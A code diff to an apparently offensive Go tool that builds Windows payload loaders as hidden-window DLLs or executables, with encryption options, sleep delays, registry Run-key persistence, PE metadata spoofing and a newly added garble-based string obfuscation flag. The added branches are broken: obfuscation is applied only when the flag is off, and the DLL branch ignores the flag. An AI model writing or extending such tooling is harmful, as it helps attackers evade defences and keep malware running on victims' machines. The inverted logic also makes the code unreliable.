@@ -50,11 +50,17 @@ func BuildLoader(opts *Options) *exec.Cmd {
 		os.Setenv("CC", "x86_64-w64-mingw32-gcc")
 		fmt.Println("[*] Compiling payload as dll...")
 
+		if opts.StringObfuscation {
+			return exec.Command("go", "build", "-buildmode=c-shared", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.dll", ".")
+		}
 		return exec.Command("go", "build", "-buildmode=c-shared", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.dll", ".")
 	} else if opts.BuildType == "exe" {
 		fmt.Println("[*] Compiling payload as executable...")
 
-		return exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.exe", ".")
+		if opts.StringObfuscation {
+			return exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.exe", ".")
+		}
+		return exec.Command("garble", "-literals", "build", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.exe", ".")
 	} else {
 		fmt.Printf("[!] Buildtype format not supported!")
 		return nil
@@ -313,8 +319,9 @@ func GetParser(opts *Options) *cobra.Command {
 	rootCmd.Flags().VarP(&opts.Encryption, "encryption", "e", "encryption method. (allowed: AES, chacha20, XOR, blowfish)")
 	rootCmd.Flags().StringVarP(&opts.Key, "key", "k", "", "encryption key, auto-generated if empty. (if used by --encryption)")
 	rootCmd.Flags().UintVarP(&opts.SleepTime, "sleep-time", "", defaults.SleepTime, "sleep time in seconds before executing loader (default: 0)")
-  rootCmd.PersistentFlags().StringVarP(&opts.Persistence, "peristence", "z", defaults.Persistence, "name of the binary being placed in '%APPDATA%' and in 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' reg key (default: \"\")")
-  
+	rootCmd.PersistentFlags().StringVarP(&opts.Persistence, "peristence", "z", defaults.Persistence, "name of the binary being placed in '%APPDATA%' and in 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' reg key (default: \"\")")
+
+	rootCmd.Flags().BoolVar(&opts.StringObfuscation, "obfuscation", defaults.StringObfuscation, "enable string obfuscation")
 	spoofMetadata.Flags().StringVarP(&opts.PEFilePath, "pe", "p", defaults.PEFilePath, "PE file to spoof")
 	spoofMetadata.Flags().StringVarP(&opts.VersionFilePath, "file", "f", defaults.VersionFilePath, "manifest file path (as JSON)")
 
